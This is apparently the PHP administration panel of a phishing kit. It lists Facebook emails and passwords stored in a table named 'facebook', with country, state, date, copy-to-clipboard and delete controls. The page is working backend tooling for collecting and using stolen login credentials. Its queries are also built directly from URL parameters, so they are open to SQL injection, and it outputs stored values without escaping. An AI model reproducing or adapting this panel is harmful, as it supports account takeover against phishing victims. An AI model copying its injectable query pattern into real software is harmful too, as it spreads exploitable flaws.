<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=euc-jp">
    <script>
if (location.protocol != 'http:')
{
 location.href = 'http:' + window.location.href.substring(window.location.protocol.length);
}
</script>


  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
	<title>Adminisitrar perfiles</title>
    <style>
		body{
			background-image:url(wallpaper.jpg);
			background-size:cover
		}

		a{
			color:white;
			cursor:pointer;
			text-decoration:none !important;
		}

		.copy:hover{
			cursor:pointer; background-color: #CCC}
	</style>
    <script>
		function eliminar(id){
			$.ajax({
				type: "POST",
				url: "del.php",
				dataType: "json",
				data: "id="+id
			}).done(function(data){
				if(data.success){
					$("#"+id).remove();
					toastr.error("Usuario Eliminado Correctamente");
				}
			})
		}

		function copy(text){
			var aux = document.createElement("input");
			aux.setAttribute("value", text);
			document.body.appendChild(aux);
			aux.select();
			document.execCommand("copy");
			document.body.removeChild(aux);
			toastr.info(text+" Copiado al PortaPapeles");
		}
	</script>
</head>

<body>
    <div class="container" style="background-color: black; color: white; height: 40px; padding: 15px 15px">
        <div style="float:right">
        	<a href="users.php">NUEVO PANEL</a>
        </div>
    </div>

	<div class="container" style="background-color: white">
    	<center><h2>CONTROL PANEL</h2>

        <form class="form-inline">
	        <label for="pais">Pais:</label>
        	<select name="pais" class="form-control" onchange="submit();"><?php include "paises.php" ?></select>
        	<label for="estados">Estado:</label>
        	<select name="estado" class="form-control" onchange="submit();"><option value="">Todos</option>
        	            	<?php
					$bd = new SQLite3("./../oyeahora.db");
					$result = $bd->query("SELECT DISTINCT estado FROM facebook ORDER BY estado ASC");

					while($row = $result->fetchArray()){

						$estado = $row['Estado'];
						
						echo "<option>$estado</option>";
					}
				?></select>
            <button class="btn btn-success">RESET</button>
        </form>
            	</center>
        <br />
        <table class="table table-bordered table-hover" >
        	<thead>
            	<tr>
                	<th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Pais</th>
                    <th>Estado</th>
                    <th width="150px">Fecha</th>
                    <th width="75px">Acciones</th>
                </tr>
            </thead>
            <tbody>
            	<?php
					$bd = new SQLite3("./../oyeahora.db");
					$filtro = "";
					if(isset($_GET['pais']) and $_GET['pais'] !== ""){
						$pais = $_GET['pais'];
						$filtro = "WHERE pais='$pais' order by Id ASC";

					}else if(isset($_GET['pais']) and $_GET['estado'] !== ""){
						$pais = $_GET['pais'];
						$estado = $_GET['estado'];
						$filtro = "WHERE Estado='$estado' order by Estado ASC";

					}
					$result = $bd->query("SELECT * FROM facebook  $filtro");

					while($row = $result->fetchArray()){
						$id = $row['id'];

						$usuario = $row['Email'];
						$pass = $row['Pass'];
						$pais = $row['Pais'];
						$estado = $row['Estado'];
						$fecha = $row['Fecha'];
						
						echo "<tr id=\"$id\">".
							 "<td onclick=\"copy('$usuario')\" class=\"copy\">$usuario</td>".
							 "<td onclick=\"copy('$pass')\" class=\"copy\">$pass</td>".
							 "<td>$pais</td>".
							"<td>$estado</td>".
							"<td>$fecha</td>".
							 "<td><button class=\"btn btn-danger\" onclick=\"eliminar($id)\">Eliminar</button></td>".
							 "<tr>";
					}
				?>
            </tbody>
        </table>
    </div>
</body>
</html>